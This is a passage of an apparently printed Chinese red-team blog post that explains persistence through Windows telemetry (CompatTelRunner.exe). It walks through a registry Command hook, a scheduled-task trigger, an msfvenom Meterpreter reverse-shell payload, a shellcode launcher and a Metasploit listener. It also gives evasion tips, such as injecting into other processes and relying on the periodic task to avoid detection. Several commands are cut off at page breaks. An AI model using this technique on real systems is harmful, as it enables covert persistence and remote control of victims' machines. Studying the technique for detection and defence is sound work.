Windows Registry Editor Version 5.00
1 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AppCompat
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 5/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
如果想⽴即执⾏查看效果可以在Cortana搜索框中输⼊“任务计划”，打开“任务计划程序”，在左侧的
导航窗格中依次展开定位⾄“任务计划程序库。
Microsoft - Windows - Application Experience”，这时你就会在右侧窗格中看到名为
Microsoft Compatibility Appraiser 的任务计划，直接右键运⾏即可。
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 6/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
或者管理员直接运⾏命令⾏：
1 schtasks /run /tn "\Microsoft\Windows\Application Experience\MicrosoftCom
等待Microsoft Compatibility Telemetry执⾏。
然后在详细信息⾥⾯可看到程序执⾏成功了。
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 7/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
有意思的是，CompatTelRunner.exe不是系统启动运⾏或者⽤户登录，它是⼀个周期性的任务，这
样可以逃避很多检测。
我们也可以在触发器中对其进⾏修改成我们需要的执⾏时间。
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 8/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
我们这⾥使⽤msf做个简单的测试：
⽤msf⾃带混淆做个raw。
1 msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.11.130 LPO
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 9/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
我们这⾥使⽤shellcode加载器：
https://github.com/clinicallyinane/shellcode_launcher/
⽬标机执⾏即可：
shellcode_launcher.exe -i shellcode.raw
这⾥写个脚本运⾏。（这⾥也能使⽤dll注⼊等各种⽅法，记得将其注⼊到其他进程中，不然进程会结
束。反弹shell命令也不宜过⻓，同样的道理。）
KALI：
1 msfconsole -q -x 'use exploit/multi/handler; set ExitOnSession false; set
我们直接输⼊命令测试⼀下：
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 10/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
SESSION1 成功上线了。
怎么实现的？
当CompatTelRunner运⾏遥测任务之前，会⾸先检查⼀些条件，⽽且必须要满⾜这些条件之⼀。
1. 系统为 Windows10或者Server2019。
2. 系统为Windows版本的客户端。
3. 键值：
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\DataColl
ection\CommercialDataOptIn是 DWORD 的类型且不为0
有 趣 的 是 ， 在 WindowsServer2016 发 ⾏ 后 某 个 版 本 添 加 了 上 ⾯ 的 检 查 条 件 。 ⽽ 在
CompatTelRunner.exe更新版本之前，这些检查将不会执⾏，并且将执⾏注册表项中的Command
命令，⽽与windows版本⽆关。
⽆论有没有成功检查，存在命令⾏参数将决定程序在哪种运⾏模式下运⾏。存在三种与某些条件相对
应的运⾏模式。
如果命令⾏参数指定了⼀个DLL或者function。则CompatTelRunner.exe会根据批准的列表对它们
进⾏验证。这将导致CompatTelRunner.exe启动DLL提供程序并退出。如果未提供DLL/功能名称，
程序将继续识别运⾏模式。
如果HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ WindowsNT \ CurrentVersion\
AppCompatFlags \ TelemetryController \Oobe存在并且没有-maintenance参数，则进⼊运⾏
模式⼆（OOBE），该键将在检查后被删除。
如果提供了-maintenance参数，那么我们需要验证运⾏并进⼊模式0，并需要验证系统状态:
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 11/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
1.HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ WindowsNT \ CurrentVersion\
AppCompatFlags \ TelemetryController \ TestAllowRun设置的REG_DWORD不能为0
2.通过系统状态验证。
系统状态验证检测件⼜由以下⼏个条件组成:
“Power Saver” （节电器）必须是关闭状态。
机器处于充电状态。
如果程序前四次验证失败，如果电池状态未知，电池电量⼤于5％或正在充电则则也通过验证。
如果通过了⼀次验证，程序将重置注册表键值RunsBlocked为0。如果没有通过则将注册表键值
RunsBlocked加1。
如果未传递任何命令⾏参数，则CompatTelRunner.exe将进⼊运⾏模式⼀（Nightly）。
确定运⾏模式后，将对计划任务执⾏⼀些检查。然后进⼊RunTelemetry区域。
如果模式为0（-maintenance），则需要进⾏⼀些额外的检查。检查结束后或者模式不为0，则程序
打开
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AppCompat
Flags\TelemetryController.
所有⼦项均在此⽂件夹下枚举，并在初始化调⽤中⽤于填充结构。
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 12/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
从反汇编中，可以看出这些字段是从注册表项填充的：
Command populates the LPWSTR Command/CommandByteLen
Maintenance sets BoolMaintenance
Nightly sets BoolNightly
Oobe sets BoolOobe
Sku sets the DWORD DWSKU
SchedulingNeeded sets BoolSchedulingNeeded
可以将指定的命令将被加载到缓冲区中，如下所示：
1 char command[520] = {0}; StringCchCatW(command, 260, L”%ls %ls%hs”, this
根据使⽤的运⾏模式/计划，可以将-oobe或-fullsync添加到命令⾏。最终，它作为第⼆个参数传递
给函数CreateProcessW(CreateProcessW)⽤于创建⼀个新进程及其主线程。新进程在调⽤进程安
全的运⾏。等效于将其作为shell命令运⾏。
这⾥需要注意的是如果是任务进程结束后，我们的⼦项也会跟着结束进程。
总结：在红蓝对抗中，套路总是在不断变化的，红队⼀直在寻找新颖有趣的⽅法来在⽬标⽹络上实现
相同的⽬标，对此我们也需要不断学习新的姿势和套路来不断完善⾃⼰与团队。
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 13/14
2020/7/27 红队之浅谈基于Windows telemetry的权限维持
参考⽂献：
https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/
https://mp.weixin.qq.com/s/Y4zK4GFD9FAmBwgKhbkS-A 14/14